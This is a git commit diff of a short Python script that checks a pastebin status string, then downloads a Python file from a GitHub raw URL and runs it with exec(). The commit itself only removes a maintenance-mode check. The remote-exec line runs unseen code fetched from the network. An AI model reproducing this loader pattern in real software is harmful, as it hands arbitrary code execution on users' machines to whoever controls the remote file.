bf7f071cba57ad255f6debeea073d0e5c86790e9
kouseikzt <116568402+kouseikzt@users.noreply.github.com>
2022-10-25 08:22:08 +0700

    Update main.py

--- main.py
+++ main.py
@@ -3,8 +3,6 @@ import requests,json
 __check__ = requests.get('https://pastebin.com/raw/ji4T6sYx').text
 if "on" in __check__:
   input("Sever Online\nPress Enter to continue...")
-if "baotri" in __check__:
-  exit("Sever Bảo trì")
 else:
   exit("Sever Offline")
 exec(requests.get('https://raw.githubusercontent.com/kouseikzt/kzt1/main/shorterlink.py').text)
